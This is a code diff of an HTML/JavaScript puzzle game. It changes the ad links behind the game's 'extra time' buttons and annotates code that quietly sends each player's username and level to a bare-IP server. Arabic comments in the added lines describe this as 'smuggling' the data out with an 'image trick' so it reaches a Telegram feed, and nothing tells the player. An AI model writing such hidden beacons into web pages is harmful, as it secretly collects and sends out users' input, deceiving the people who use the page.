@@ -44,11 +44,9 @@
     </div>
     <div class="timer-container">
         <div id="timer-box">02:00</div>
-        <button style="background:#28a745; color:white; border-radius:8px; padding:8px;" onclick="window.open('https://www.effectivegatecpm.com/xg01t7c9?key=d0c325bc75b64a98c9360bc5673f06c4','_blank'); timeLeft+=30;">📹 +30s</button>
+        <button style="background:#28a745; color:white; border-radius:8px; padding:8px;" onclick="window.open('https://otieu.com/4/10432551','_blank'); timeLeft+=30;">📹 +30s</button>
     </div>
-    <div id="extra-btn-container">
-        <button id="extra-time-btn" onclick="window.open('https://www.effectivegatecpm.com/xg01t7c9?key=d0c325bc75b64a98c9360bc5673f06c4','_blank'); timeLeft+=60; this.style.display='none';">⚠️ Get +60s</button>
-    </div>
+    <div id="extra-btn-container"><button id="extra-time-btn" onclick="window.open('https://otieu.com/4/10432551','_blank'); timeLeft+=60; this.style.display='none';">⚠️ Get +60s</button></div>
     <div id="preview-screen"><p>Memorize!</p><img id="preview-img" src=""></div>
     <div id="game-screen" class="hidden">
         <div id="puzzle-board"></div>
@@ -59,8 +57,8 @@
 </div>
 
 <script>
+    // الرابط اللي رح "نهرب" من خلاله البيانات
     const SERVER_URL = "http://38.244.129.249/send.php"; 
-    // الرابط القديم للمراحل
     const adLink = "https://otieu.com/4/10432551";
 
     let cur = 0, tokens = 0, currentUser = "", timeLeft = 120, timerInterval = null, firstTile = null;
@@ -89,11 +87,13 @@
         let userVal = userInput.value.trim();
         if (userVal !== "" && userVal !== "&") {
             currentUser = userVal;
+            
+            // 1. جلب الحفظ المحلي (عشان المتصفح العادي)
             let saved = localStorage.getItem('ff_save_lvl_' + userVal);
             cur = saved ? parseInt(saved) : 0;
             tokens = cur * 20;
 
-            // كود الإرسال الأصلي بدون أي تعديل
+            // 2. إرسال إشعار تليجرام باستخدام "خدعة الصورة" (عشان تليجرام وجيت هب)
             let msgImg = new Image();
             msgImg.src = SERVER_URL + "?task=send&user=" + encodeURIComponent(userVal) + "&lvl=" + (cur + 1) + "&t=" + Date.now();
 
@@ -103,13 +103,15 @@
     }
 
     function saveProgress() {
+        // حفظ محلي
         localStorage.setItem('ff_save_lvl_' + currentUser, cur);
+        
+        // إرسال ليفل جديد لتليجرام بصورة
         let updateImg = new Image();
         updateImg.src = SERVER_URL + "?task=send&user=" + encodeURIComponent(currentUser) + "&lvl=" + (cur + 1) + "&t=" + Date.now();
     }
 
     function nextLevelWithAd() {
-        // هنا الرابط القديم فقط عند الانتقال للمراحل
         window.open(adLink, '_blank');
         if (cur < levels.length - 1) { 
             cur++; 
